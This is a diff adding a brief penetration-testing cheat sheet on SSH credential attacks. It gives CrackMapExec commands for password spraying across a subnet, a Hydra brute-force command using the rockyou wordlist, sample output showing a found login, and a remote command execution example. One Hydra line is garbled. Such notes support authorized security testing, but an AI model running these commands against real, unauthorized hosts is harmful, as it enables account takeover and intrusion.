@@ -1,1 +1,29 @@
+Password spraying
+Password spraying (without bruteforce)
+cme ssh 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
 
+Hydra
+SSH
+Bruteforce SSH credentials
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh
+
+-f: Exit as soon as at least one a login and a password combination is found
+-t: Tasks, run tasks number of connects in parallel per target, default is 16 Tasks. 
+
+For ssh attack
+#Hydra -l userlogin -P password-list-adress ssh:// — — IP — Address -V
+
+Authentication
+Testing credentials
+cme ssh 192.168.1.0/24 -u user -p password
+
+Expected Results:
+SSH         127.0.0.1       22     127.0.0.1        [*] SSH-2.0-OpenSSH_8.2p1 Debian-4
+SSH         127.0.0.1       22     127.0.0.1        [+] user:password
+
+Specify Ports
+cme http 192.168.1.0/24 --port 2222
+
+Command execution
+Execute Command
+cme ssh 127.0.0.1 -u user -p password -x whoami
